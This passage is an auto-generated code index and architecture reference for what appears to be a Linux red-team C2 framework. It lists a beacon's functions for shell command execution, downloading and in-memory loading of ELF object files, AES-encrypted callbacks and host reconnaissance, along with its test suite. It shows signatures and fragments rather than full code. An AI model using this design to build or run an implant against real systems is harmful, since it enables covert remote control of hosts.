(hlen != outlen * 2) return -1; for (size_t i = 0; i < outlen; i++) { unsigned int byte; if (sscanf(hex + i * 2, \"%2x\", &byte) != 1) return -1; out[i] = (uint8_t)byte; } return 0; } /* --- per-section parsers ---", "kind": "function", "line": 186, "name": "parse_c2", "signature": "static void parse_c2(const char *p, const char *end, bsb_config_t *cfg)"}, {"kind": "function", "line": 208, "name": "parse_crypto", "signature": "static void parse_crypto(const char *p, const char *end, bsb_config_t *cfg)"}, {"kind": "function", "line": 229, "name": "parse_timing", "signature": "static void parse_timing(const char *p, const char *end, bsb_config_t *cfg)"}, {"kind": "function", "line": 252, "name": "parse_network", "signature": "static void parse_network(const char *p, const char *end, bsb_config_t *cfg)"}, {"kind": "function", "line": 288, "name": "parse_bof", "signature": "static void parse_bof(const char *p, const char *end, bsb_config_t *cfg)"}, {"kind": "function", "line": 307, "name": "parse_backoff", "signature": "static void parse_backoff(const char *p, const char *end, bsb_config_t *cfg)"}, {"doc": "if (!expect(&p, end, ':')) return; if (!strcmp(key, \"base_seconds\")) { if (!read_int(&p, end, &cfg->backoff.base_seconds)) return; } else if (!strcmp(key, \"max_seconds\")) { if (!read_int(&p, end, &cfg->backoff.max_seconds)) return; } else { p = skip_value(p, end); if (!p) return; } p = skip_ws(p, end); if (p < end && *p == ',') p++; } } /* --- main load ---", "kind": "function", "line": 328, "name": "bsb_config_load", "signature": "int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen)"}, {"doc": "Return the directory the running binary lives in, or NULL if we cannot resolve it (e.g. on platforms without /proc/self/exe). The returned buffer is statically sized; the caller copies if * it needs to keep the value past subsequent calls.", "kind": "function", "line": 420, "name": "binary_dir", "signature": "static const char *binary_dir(char *out, size_t outsz)"}, {"kind": "function", "line": 437, "name": "bsb_config_load_default", "signature": "int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen)"}, {"kind": "function", "line": 465, "name": "bsb_config_sleep_seconds", "signature": "int bsb_config_sleep_seconds(const bsb_config_t *cfg)"}, {"kind": "function", "line": 27, "name": "fseek", "signature": "fseek(f, 0, SEEK_END);"}, {"kind": "function", "line": 35, "name": "fclose", "signature": "fclose(f);"}, {"kind": "function", "line": 330, "name": "memset", "signature": "memset(cfg, 0, sizeof(*cfg));"}, {"kind": "function", "line": 331, "name": "snprintf", "signature": "snprintf(cfg->path, sizeof(cfg->path), \"%s\", path);"}, {"kind": "function", "line": 365, "name": "free", "signature": "free(buf);"}, {"kind": "macro", "line": 13, "name": "_POSIX_C_SOURCE", "signature": "#define _POSIX_C_SOURCE"}]}, {"id": "include/config.h", "kind": "module", "label": "config.h", "language": "h", "sha256": "40526e9f0d21cee2", "symbol_count": 21, "symbols": [{"kind": "struct", "line": 30, "name": "bsb_c2_t"}, {"kind": "struct", "line": 37, "name": "bsb_crypto_t"}, {"kind": "struct", "line": 42, "name": "bsb_timing_t"}, {"kind": "struct", "line": 49, "name": "bsb_network_t"}, {"kind": "struct", "line": 55, "name": "bsb_bof_t"}, {"kind": "struct", "line": 60, "name": "bsb_backoff_config_t"}, {"kind": "struct", "line": 65, "name": "bsb_config_t"}, {"doc": "Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-NULL).", "kind": "function", "line": 77, "name": "bsb_config_load", "signature": "int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen);"}, {"doc": "Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-NULL). int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen); /* Load from BSB_CONFIG env or default path.", "kind": "function", "line": 80, "name": "bsb_config_load_default", "signature": "int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen);"}, {"doc": "Load config from path. Returns 0 on success, -1 on error. * On error, leaves a human-readable message in `err` (if non-NULL). int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen); /* Load from BSB_CONFIG env or default path. int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen); /* Compute a sleep duration with jitter applied. Returns seconds.", "kind": "function", "line": 83, "name": "bsb_config_sleep_seconds", "signature": "int bsb_config_sleep_seconds(const bsb_config_t *cfg);"}, {"kind": "macro", "line": 14, "name": "BSB_CONFIG_H", "signature": "#define BSB_CONFIG_H"}, {"kind": "macro", "line": 18, "name": "BSB_CONFIG_PATH_DEFAULT", "signature": "#define BSB_CONFIG_PATH_DEFAULT"}, {"kind": "macro", "line": 20, "name": "BSB_CONFIG_PATH_ENV", "signature": "#define BSB_CONFIG_PATH_ENV"}, {"kind": "macro", "line": 21, "name": "BSB_MAX_URL", "signature": "#define BSB_MAX_URL"}, {"kind": "macro", "line": 22, "name": "BSB_MAX_URI", "signature": "#define BSB_MAX_URI"}, {"kind": "macro", "line": 23, "name": "BSB_MAX_CLIENT_ID", "signature": "#define BSB_MAX_CLIENT_ID"}, {"kind": "macro", "line": 24, "name": "BSB_AES_KEY_HEX_LEN", "signature": "#define BSB_AES_KEY_HEX_LEN"}, {"kind": "macro", "line": 25, "name": "BSB_AES_KEY_BYTES", "signature": "#define BSB_AES_KEY_BYTES"}, {"kind": "macro", "line": 26, "name": "BSB_MAX_USER_AGENTS", "signature": "#define BSB_MAX_USER_AGENTS"}, {"kind": "macro", "line": 27, "name": "BSB_USER_AGENT_LEN", "signature": "#define BSB_USER_AGENT_LEN"}, {"kind": "macro", "line": 28, "name": "BSB_REPORT_URI_DEFAULT", "signature": "#define BSB_REPORT_URI_DEFAULT"}]}, {"id": "include/config_py.py", "kind": "module", "label": "config_py.py", "language": "py", "sha256": "e043d2d1bf485073", "symbol_count": 2, "symbols": [{"doc": "Recursively merge overlay into base; overlay wins.", "kind": "function", "line": 55, "name": "_deep_merge", "signature": "def _deep_merge(base, overlay)"}, {"doc": "Load and validate a BSB config file.\n\nRaises ValueError on any schema violation. Returns a dict\nmatching DEFAULTS' structure.", "kind": "function", "line": 65, "name": "load_config", "signature": "def load_config(path)"}]}, {"doc": "install.sh - Install build deps and build everything.  Idempotent: safe to run on a fresh checkout. Tested on Debian 12 and Ubuntu 22.04.  For day-to-day development, prefer running `make` directly so errors are reported per-target. This script is for first-time setup and CI parity.", "id": "install.sh", "kind": "module", "label": "install.sh", "language": "sh", "sha256": "c907d80fd6734993", "symbol_count": 0, "symbols": []}, {"doc": "is_sudo.c — LazyOwn RedTeam BOF (Linux/x64) define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos", "id": "issudo.c", "kind": "module", "label": "issudo.c", "language": "c", "sha256": "bfffd50d03881725", "symbol_count": 18, "symbols": [{"doc": "Tipos", "kind": "type_alias", "line": 6, "name": "size_t", "signature": "typedef unsigned long size_t;"}, {"kind": "type_alias", "line": 7, "name": "ssize_t", "signature": "typedef long ssize_t;"}, {"doc": "Wrappers", "kind": "function", "line": 22, "name": "syscall3", "signature": "static inline long syscall3(long n, long a1, long a2, long a3)"}, {"kind": "function", "line": 31, "name": "syscall1", "signature": "static inline long syscall1(long n, long a1)"}, {"doc": "strcmp mínimo (necesario para comparar strings)", "kind": "function", "line": 43, "name": "strcmp", "signature": "static int strcmp(const char *s1, const char *s2)"}, {"doc": "Obtener username desde /etc/passwd (sin libc)", "kind": "function", "line": 52, "name": "get_username_from_uid", "signature": "static int get_username_from_uid(long uid, char *buf, int buf_size)"}, {"kind": "function", "line": 107, "name": "go", "signature": "void go(char *args, int alen)"}, {"doc": "Símbolos del beacon", "kind": "function", "line": 10, "name": "BeaconPrintf", "signature": "extern void BeaconPrintf(int, const char*, ...);"}, {"kind": "function", "line": 11, "name": "BeaconOutput", "signature": "extern void BeaconOutput(int, const char*, int);"}, {"kind": "function", "line": 24, "name": "volatile", "signature": "__asm__ volatile (\"syscall\" : \"=a\"(ret) : \"a\"(n), \"D\"(a1), \"S\"(a2), \"d\"(a3) : \"rcx\", \"r11\", \"memory\" );"}, {"kind": "macro", "line": 2, "name": "NULL", "signature": "#define NULL"}, {"kind": "macro", "line": 3, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 14, "name": "SYS_openat", "signature": "#define SYS_openat"}, {"kind": "macro", "line": 15, "name": "SYS_read", "signature": "#define SYS_read"}, {"kind": "macro", "line": 16, "name": "SYS_close", "signature": "#define SYS_close"}, {"kind": "macro", "line": 17, "name": "SYS_getuid", "signature": "#define SYS_getuid"}, {"kind": "macro", "line": 18, "name": "SYS_getpwuid_r", "signature": "#define SYS_getpwuid_r"}, {"kind": "macro", "line": 19, "name": "AT_FDCWD", "signature": "#define AT_FDCWD"}]}, {"id": "tests/config_harness.c", "kind": "module", "label": "config_harness.c", "language": "c", "sha256": "09a63a203225de5f", "symbol_count": 4, "symbols": [{"kind": "function", "line": 21, "name": "main", "signature": "int main(void)"}, {"kind": "function", "line": 26, "name": "fprintf", "signature": "fprintf(stderr, \"config error: %s\\n\", err);"}, {"kind": "function", "line": 31, "name": "hex_encode", "signature": "hex_encode(cfg.crypto.key, BSB_AES_KEY_BYTES, key_hex);"}, {"kind": "function", "line": 32, "name": "printf", "signature": "printf(\"c2.url=%s\\n\", cfg.c2.url);"}]}, {"id": "tests/crypto_harness.c", "kind": "module", "label": "crypto_harness.c", "language": "c", "sha256": "0a25b5bb698f31b9", "symbol_count": 6, "symbols": [{"doc": "crypto_harness.c - Roundtrip test harness for AES-256-CFB.  Used by tests/test_crypto.py to validate the AES path the beacon and C2 server use for command/result encryption.  include \"aes_cfb.h\" include <stdio.h> include <stdlib.h> include <string.h>", "kind": "function", "line": 11, "name": "hex_to_bytes", "signature": "static int hex_to_bytes(const char *hex, unsigned char *out, size_t outlen)"}, {"kind": "function", "line": 22, "name": "main", "signature": "int main(int argc, char **argv)"}, {"kind": "function", "line": 31, "name": "fprintf", "signature": "fprintf(stderr, \"usage: %s --key <64hex> --plain <text>\\n\", argv[0]);"}, {"kind": "function", "line": 37, "name": "printf", "signature": "printf(\"FAIL:bad-key\\n\");"}, {"kind": "function", "line": 50, "name": "free", "signature": "free(cipher);"}, {"kind": "function", "line": 68, "name": "snprintf", "signature": "snprintf(hex + i*2, 3, \"%02x\", cipher[i]);"}]}, {"id": "tests/test_beacon_build.py", "kind": "module", "label": "test_beacon_build.py", "language": "py", "sha256": "88886278ec81ac1f", "symbol_count": 7, "symbols": [{"doc": "Return True if openssl and curl headers are present.", "kind": "function", "line": 20, "name": "have_headers", "signature": "def have_headers()"}, {"kind": "function", "line": 34, "name": "compile_beacon", "signature": "def compile_beacon()"}, {"kind": "function", "line": 50, "name": "inspect_binary", "signature": "def inspect_binary()"}, {"kind": "function", "line": 55, "name": "test_beacon_compiles_and_links", "signature": "def test_beacon_compiles_and_links()"}, {"kind": "function", "line": 64, "name": "test_beacon_exposes_bof_api", "signature": "def test_beacon_exposes_bof_api()"}, {"kind": "function", "line": 85, "name": "test_beacon_exposes_elf_loader", "signature": "def test_beacon_exposes_elf_loader()"}, {"kind": "function", "line": 96, "name": "main", "signature": "def main()"}]}, {"id": "tests/test_bof_compile.py", "kind": "module", "label": "test_bof_compile.py", "language": "py", "sha256": "087f59a2fca68348", "symbol_count": 7, "symbols": [{"kind": "function", "line": 21, "name": "compile_bof", "signature": "def compile_bof(name)"}, {"kind": "function", "line": 35, "name": "inspect_symbols", "signature": "def inspect_symbols(obj_path)"}, {"kind": "function", "line": 53, "name": "test_compile_all", "signature": "def test_compile_all()"}, {"kind": "function", "line": 60, "name": "test_export_go", "signature": "def test_export_go()"}, {"kind": "function", "line": 68, "name": "test_unresolved_beacon_api", "signature": "def test_unresolved_beacon_api()"}, {"doc": "Make sure we did not pull in glibc symbols by accident.", "kind": "function", "line": 80, "name": "test_no_libc_leak", "signature": "def test_no_libc_leak()"}, {"kind": "function", "line": 91, "name": "main", "signature": "def main()"}]}, {"id": "tests/test_c2_http_e2e.py", "kind": "module", "label": "test_c2_http_e2e.py", "language": "py", "sha256": "eb6bac4aed6137eb", "symbol_count": 9, "symbols": [{"kind": "function", "line": 43, "name": "_free_port", "signature": "def _free_port()"}, {"kind": "function", "line": 51, "name": "_recv_response", "signature": "def _recv_response(sock, timeout)"}, {"doc": "Beacon-style HTTP/1.1 GET /<uri>/<id> must return a base64\nbody the server can encrypt and we can decrypt with the shared\nAES key. Before the fix, the server returned iUNKNOWN_SELECTOR.", "kind": "function", "line": 65, "name": "test_http_get_poll_returns_encrypted_command", "signature": "def test_http_get_poll_returns_encrypted_command()"}, {"doc": "Beacon-style HTTP/1.1 POST /report/<b64> must reach the\nreport handler, decrypt, parse, and write a CSV row. Before\nthe fix, the POST went to the same URL as the GET (poll),\nso the server logged an UNKNOWN_SELECTOR error and the\nCSV never had a row for this client.", "kind": "function", "line": 115, "name": "test_http_post_report_writes_log", "signature": "def test_http_post_report_writes_log()"}, {"doc": "The old Gopher-style selector (single line, CRLF) must\nstill dispatch correctly — server.py keeps that path so\nanything that depended on it is not broken by the new\nHTTP/1.1 entry point.", "kind": "function", "line": 183, "name": "test_gopher_legacy_still_works", "signature": "def test_gopher_legacy_still_works()"}, {"doc": "The beacon percent-encodes the base64 payload before\nsplicing it onto the URL path. Standard base64 uses '+',\n'/', and '=' which would otherwise produce an invalid\nHTTP request line (extra '/' would split the path, '+'\nis space-encoded, '=' is a query marker). This test\nreplicates that: encode the payload exactly as the\nbeacon does, send it, and assert the report is decrypted\nand logged.", "kind": "function", "line": 233, "name": "test_http_post_with_url_encoded_b64_payload", "signature": "def test_http_post_with_url_encoded_b64_payload()"}, {"doc": "When the client sends a long POST URL that crosses a TCP\nsegment boundary, the first recv() inside server.serve() may\nnot include \"HTTP/1.1\" yet. Before the _read_http_request\nfix, this made the dispatcher fall through to the legacy\nGopher branch and return iUNKNOWN_SELECTOR. We reproduce that\nfragmentation here by sending the request in two pieces with\na small delay between them. The expected behavior is that the\nserver still parses the full request, decrypts, and writes\nthe log line.", "kind": "function", "line": 326, "name": "test_fragmented_post_is_dispatched_as_http", "signature": "def test_fragmented_post_is_dispatched_as_http()"}, {"kind": "function", "line": 399, "name": "main", "signature": "def main()"}, {"kind": "function", "line": 274, "name": "encode", "signature": "def encode(s)"}]}, {"id": "tests/test_c2_server.py", "kind": "module", "label": "test_c2_server.py", "language": "py", "sha256": "2db3913a5118501b", "symbol_count": 11, "symbols": [{"kind": "function", "line": 39, "name": "make_state", "signature": "def make_state(tmp)"}, {"kind": "function", "line": 46, "name": "test_get_command_empty", "signature": "def test_get_command_empty()"}, {"kind": "function", "line": 58, "name": "test_get_command_queued", "signature": "def test_get_command_queued()"}, {"kind": "function", "line": 69, "name": "test_report_writes_log", "signature": "def test_report_writes_log()"}, {"kind": "function", "line": 85, "name": "test_bof_not_found", "signature": "def test_bof_not_found()"}, {"kind": "function", "line": 92, "name": "test_bof_serves_existing_file", "signature": "def test_bof_serves_existing_file()"}, {"kind": "function", "line": 104, "name": "test_unknown_selector", "signature": "def test_unknown_selector()"}, {"doc": "Path-traversal in /bof/ should be neutralised by os.path.basename.", "kind": "function", "line": 111, "name": "test_path_traversal_in_bof_name", "signature": "def test_path_traversal_in_bof_name()"}, {"doc": "encrypt then decrypt empty payload must yield single NUL byte.", "kind": "function", "line": 120, "name": "test_roundtrip_empty", "signature": "def test_roundtrip_empty()"}, {"kind": "function", "line": 127, "name": "test_roundtrip_text", "signature": "def test_roundtrip_text()"}, {"kind": "function", "line": 134, "name": "main", "signature": "def main()"}]}, {"id": "tests/test_config.py", "kind": "module", "label": "test_config.py", "language": "py", "sha256": "0a8f5068e945b369", "symbol_count": 9, "symbols": [{"doc": "Build the test harness against config.c.", "kind": "function", "line": 24, "name": "compile_harness", "signature": "def compile_harness()"}, {"doc": "Write a config file, run the harness, return parsed output.", "kind": "function", "line": 38, "name": "run_harness", "signature": "def run_harness(config_text)"}, {"kind": "function", "line": 55, "name": "test_default_load", "signature": "def test_default_load()"}, {"kind": "function", "line": 73, "name": "test_overrides", "signature": "def test_overrides()"}, {"kind": "function", "line": 90, "name": "test_missing_file", "signature": "def test_missing_file()"}, {"doc": "$BSB_CONFIG must take precedence over the binary-relative path.", "kind": "function", "line": 98, "name": "test_search_order_env_wins", "signature": "def test_search_order_env_wins()"}, {"doc": "With BSB_CONFIG unset, the harness resolves to ./config.json\n(the binary-relative lookup is irrelevant in the harness because\nthe harness lives in tests/, not next to a config.json).", "kind": "function", "line": 115, "name": "test_search_order_falls_back_to_cwd_default", "signature": "def test_search_order_falls_back_to_cwd_default()"}, {"kind": "function", "line": 141, "name": "test_bad_hex_key", "signature": "def test_bad_hex_key()"}, {"kind": "function", "line": 156, "name": "main", "signature": "def main()"}]}, {"id": "tests/test_crypto.py", "kind": "module", "label": "test_crypto.py", "language": "py", "sha256": "412090797c6efb01", "symbol_count": 8, "symbols": [{"kind": "function", "line": 18, "name": "compile_harness", "signature": "def compile_harness()"}, {"kind": "function", "line": 32, "name": "run", "signature": "def run(plaintext, key_hex)"}, {"kind": "function", "line": 40, "name": "test_short", "signature": "def test_short()"}, {"kind": "function", "line": 44, "name": "test_block_boundary", "signature": "def test_block_boundary()"}, {"kind": "function", "line": 49, "name": "test_longer_than_block", "signature": "def test_longer_than_block()"}, {"kind": "function", "line": 55, "name": "test_known_ciphertext", "signature": "def test_known_ciphertext()"}, {"doc": "The Python C2 server must be able to decrypt C-encrypted\ncommands. We feed a known key+plaintext through the C harness,\nextract the ciphertext, then decrypt with Python and check we\nrecover the original plain.", "kind": "function", "line": 74, "name": "test_python_can_decrypt_c_ciphertext", "signature": "def test_python_can_decrypt_c_ciphertext()"}, {"kind": "function", "line": 107, "name": "main", "signature": "def main()"}]}, {"id": "tests/test_install_deploy.py", "kind": "module", "label": "test_install_deploy.py", "language": "py", "sha256": "37147c25202f8521", "symbol_count": 8, "symbols": [{"doc": "Clean and build everything, return nothing.", "kind": "function", "line": 23, "name": "make_all", "signature": "def make_all()"}, {"kind": "function", "line": 29, "name": "run_beacon", "signature": "def run_beacon(binary, cwd)"}, {"doc": "The point of this whole iteration: `make beacon` leaves\na runnable binary with its config next to it, no env vars\nor extra steps required.", "kind": "function", "line": 42, "name": "test_build_beacon_lands_alongside_config", "signature": "def test_build_beacon_lands_alongside_config()"}, {"kind": "function", "line": 53, "name": "test_staged_files_have_correct_modes", "signature": "def test_staged_files_have_correct_modes()"}, {"doc": "Drop the operator in /tmp; the staged beacon should still\nfind build/config.json via the binary-relative search path.", "kind": "function", "line": 61, "name": "test_staged_beacon_runs_from_any_cwd", "signature": "def test_staged_beacon_runs_from_any_cwd()"}, {"kind": "function", "line": 74, "name": "test_staged_bofs_are_present", "signature": "def test_staged_bofs_are_present()"}, {"doc": "make clean must wipe build/ — including the staged config.json —\nbut leave config/config.json (the operator's copy) alone.\n\nThis is the last test that runs, so we leave the operator with a\nfresh deliverable tree afterwards. `make clean` is destructive\nand the operator's only copy of build/ is whatever the previous\ntest left behind; rebuilding here guarantees `./build/beacon`\nand the staged BOFs are present after `make test` finishes.", "kind": "function", "line": 82, "name": "test_clean_removes_everything", "signature": "def test_clean_removes_everything()"}, {"kind": "function", "line": 104, "name": "main", "signature": "def main()"}]}], "type": "CodePropertyGraph", "version": "1.0"}
```

---

## Architecture Reference

### C (29 files)

#### `aes.c`
**Path:** `aes.c`
**File Doc:** *aes.c - tiny-AES-c (https://github.com/kokke/tiny-AES-c) include "aes.h" include <string.h>  define Nb 4    define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16*

**Functions:**
- `getSBoxValue` (line 12) `static uint8_t getSBoxValue(uint8_t num)` - *define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16*
- `getSBoxInvert` (line 34) `static uint8_t getSBoxInvert(uint8_t num)`
- `Td0` (line 56) `static uint8_t Td0(int x)`
- `Td1` (line 58) `static uint8_t Td1(int x)`
- `Td2` (line 59) `static uint8_t Td2(int x)`
- `Td3` (line 60) `static uint8_t Td3(int x)`
- `Td4` (line 61) `static uint8_t Td4(int x)`
- `KeyExpansion` (line 166) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)` - *This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.*
- `AES_init_ctx` (line 238) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- `AES_init_ctx_iv` (line 244) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)` - *if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))*
- `AES_ctx_set_iv` (line 249) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- `AddRoundKey` (line 257) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)` - *This function adds the round key to state. The round key is added to the state by an XOR function.*
- `SubBytes` (line 271) `static void SubBytes(state_t* state)` - *The SubBytes Function Substitutes the values in the state matrix with values in an S-box.*
- `ShiftRows` (line 286) `static void ShiftRows(state_t* state)` - *The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = Row number. So the first row is not shifted.*
- `xtime` (line 313) `static uint8_t xtime(uint8_t x)`
- `MixColumns` (line 320) `static void MixColumns(state_t* state)` - *MixColumns function mixes the columns of the state matrix*
- `Multiply` (line 340) `static uint8_t Multiply(uint8_t x, uint8_t y)` - *Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary The compiler seems to be able to vectorize the operation better this way. See https://github.com/kokke/tiny-AES-c/pull/34 if MULTIPLY_AS_A_FUNCTION*
- `InvMixColumns` (line 370) `static void InvMixColumns(state_t* state)` - *MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand for the inexperienced. Please use the references to gain more information.*
- `InvSubBytes` (line 391) `static void InvSubBytes(state_t* state)` - *The SubBytes Function Substitutes the values in the state matrix with values in an S-box.*
- `InvShiftRows` (line 402) `static void InvShiftRows(state_t* state)`
- `Cipher` (line 433) `static void Cipher(state_t* state, const uint8_t* RoundKey)` - *Cipher is the main function that encrypts the PlainText.*
- `InvCipher` (line 459) `static void InvCipher(state_t* state, const uint8_t* RoundKey)` - *if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)*
- `AES_ECB_encrypt` (line 488) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)` - *AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)  /* Public functions:  if defined(ECB) && (ECB == 1)*
- `AES_ECB_decrypt` (line 495) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- `XorWithIv` (line 510) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)` - *if defined(CBC) && (CBC == 1)*
- `AES_CBC_encrypt_buffer` (line 520) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- `AES_CBC_decrypt_buffer` (line 535) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- `AES_CTR_xcrypt_buffer` (line 558) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)` - *XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key*
- `memcpy` (line 247) `memcpy (ctx->Iv, iv, AES_BLOCKLEN);`

**Macros:**
- `Nb` (line 4) `#define Nb`
- `KEYLEN_256` (line 6) `#define KEYLEN_256`
- `RKLENGTH` (line 10) `#define RKLENGTH`
- `BLOCKLEN` (line 11) `#define BLOCKLEN`
- `Nb` (line 67) `#define Nb`
- `Nk` (line 70) `#define Nk`
- `Nr` (line 71) `#define Nr`
- `Nk` (line 73) `#define Nk`
- `Nr` (line 74) `#define Nr`
- `Nk` (line 76) `#define Nk`
- `Nr` (line 77) `#define Nr`
- `MULTIPLY_AS_A_FUNCTION` (line 84) `#define MULTIPLY_AS_A_FUNCTION`
- `getSBoxValue` (line 163) `#define getSBoxValue(num)`
- `Multiply` (line 349) `#define Multiply(x, y)`
- `getSBoxInvert` (line 365) `#define getSBoxInvert(num)`

#### `beacon3.c`
**Path:** `beacon3.c`
**File Doc:** *define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h>  include "beacon.h" include "aes.h"*

**Functions:**
- `__attribute__` (line 140) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- `BeaconPrintf` (line 193) `void BeaconPrintf(int type, const char *fmt, ...)` - *=== BEACON API ===*
- `BeaconOutput` (line 205) `void BeaconOutput(int type, const char *data, int len)`
- `create_trampoline` (line 217) `static void* create_trampoline(void* target)` - *=== CRATE TRAPOLINE ===*
- `cleanup_trampolines` (line 253) `static void cleanup_trampolines(void)` - *=== CLEAN TRAMPOLINE ===*
- `get_or_create_trampoline` (line 268) `static void* get_or_create_trampoline(void* target)`
- `WriteMemoryCallback` (line 300) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)` - *=== CURL WRITE CALLBACK ===*
- `https_request` (line 317) `char* https_request(const char* url, const char* method, const char* post_data)` - *=== HTTPS REQUEST ===*
- `base64_encode` (line 406) `char* base64_encode(const unsigned char* input, int len)` - *=== BASE64 ===*
- `base64_decode` (line 422) `unsigned char* base64_decode(const char* input, int* len)`
- `aes256_cfb_encrypt` (line 446) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...` - *=== AES CFB ===*
- `aes256_cfb_decrypt` (line 473) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- `exec_cmd` (line 504) `char* exec_cmd(const char* cmd, int* out_len)` - *=== EXEC CMD ===*
- `page_align` (line 525) `static size_t page_align(size_t size)` - *=== Función auxiliar: alinear al tamaño de página ===*
- `RunELF` (line 530) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- `get_local_ips` (line 912) `char* get_local_ips()` - *=== GET LOCAL IPs ===*
- `download_bof` (line 941) `unsigned char* download_bof(const char* url, size_t* out_size)` - *=== DOWNLOAD BOF ===*
- `run_bof_and_capture` (line 963) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...` - *=== RUN BOF AND CAPTURE ===*
- `main` (line 1007) `int main()` - *=== MAIN ===*
- `void` (line 63) `typedef void (*bof_func_t)(char*, int);` - *=== TIPOS Y SÍMBOLOS FALTANTES ===*
- `volatile` (line 146) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //` - *CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call*
- `va_start` (line 196) `va_start(args, fmt);`
- `va_end` (line 200) `va_end(args);`
- `memcpy` (line 211) `memcpy(g_beacon_output + g_output_len, data, len);`
- `fprintf` (line 224) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- `munmap` (line 240) `munmap(code, code_size);`
- `free` (line 257) `free(g_trampolines);`
- `fflush` (line 321) `fflush(stderr);`
- `curl_easy_setopt` (line 335) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- `curl_easy_cleanup` (line 380) `curl_easy_cleanup(curl);`
- `BIO_set_flags` (line 412) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- `BIO_write` (line 413) `BIO_write(b64, input, len);`
- `BIO_flush` (line 414) `BIO_flush(b64);`
- `BIO_get_mem_ptr` (line 415) `BIO_get_mem_ptr(b64, &bptr);`
- `BIO_free_all` (line 419) `BIO_free_all(b64);`
- `AES_init_ctx` (line 449) `AES_init_ctx(&ctx, key);`
- `AES_ECB_encrypt` (line 457) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- `memset` (line 466) `memset(iv_buf + block_size, 0, 16 - block_size);`
- `pclose` (line 509) `pclose(fp);`
- `perror` (line 701) `perror("calloc");`
- `call_bof_isolated` (line 897) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- `close` (line 920) `close(sockfd);`
- `strdup` (line 921) `return strdup("127.0.0.1");`
- `inet_ntop` (line 931) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- `strcat` (line 933) `strcat(result, ip);`
- `strlen` (line 937) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- `printf` (line 952) `printf("[DEBUG] download_bof: descargados %zu bytes\n", *out_size);`
- `srand` (line 1009) `srand(time(NULL));`
- `sscanf` (line 1013) `sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);`
- `snprintf` (line 1017) `snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);`
- `sleep` (line 1030) `sleep(6);`
- `gethostname` (line 1122) `gethostname(hostname, sizeof(hostname) - 1);`
